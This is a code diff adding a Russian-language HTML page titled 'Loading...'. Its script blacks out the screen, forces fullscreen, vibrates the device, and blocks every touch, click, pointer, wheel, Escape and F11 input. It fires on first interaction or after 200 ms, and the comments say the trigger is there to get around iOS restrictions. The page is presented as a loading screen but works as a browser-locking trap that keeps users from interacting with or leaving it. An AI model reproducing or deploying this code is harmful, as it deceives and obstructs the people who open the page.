@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Загрузка...</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; width: 100%; height: 100%;
+    background: #000; overflow: hidden; position: fixed;
+    touch-action: none; user-select: none; -webkit-user-select: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+  #blackout {
+    position: fixed; inset: 0; background: #000;
+    z-index: 2147483647; display: none;
+  }
+</style>
+</head>
+<body>
+<div id="blackout"></div>
+<script>
+(function () {
+  const blackout = document.getElementById('blackout');
+
+  function goBlack() {
+    blackout.style.display = 'block';
+    document.documentElement.style.background = '#000';
+    document.body.style.background = '#000';
+
+    // попытка fullscreen (сработает в большинстве случаев)
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+    // вибрация (Android)
+    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+
+    // блокируем все тач-события
+    const block = e => { e.preventDefault(); e.stopPropagation(); return false; };
+    ['touchstart','touchmove','touchend','touchcancel',
+     'click','dblclick','contextmenu','gesturestart',
+     'gesturechange','gestureend','pointerdown','pointerup']
+      .forEach(evt => document.addEventListener(evt, block, { capture: true, passive: false }));
+
+    // блокируем скролл и зум
+    window.addEventListener('wheel', block, { passive: false });
+    window.addEventListener('keydown', e => {
+      // блок клавиш выхода на десктопе
+      if (e.key === 'Escape' || e.key === 'F11') e.preventDefault();
+    }, true);
+  }
+
+  // запуск после первого взаимодействия (обход iOS-политики)
+  let fired = false;
+  function once() {
+    if (fired) return; fired = true; goBlack();
+  }
+  document.addEventListener('touchstart', once, { once: true, passive: true });
+  document.addEventListener('click', once, { once: true });
+  // автозапуск через 200мс (сработает на Android Chrome)
+  setTimeout(once, 200);
+})();
+</script>
+</body>
+</html>
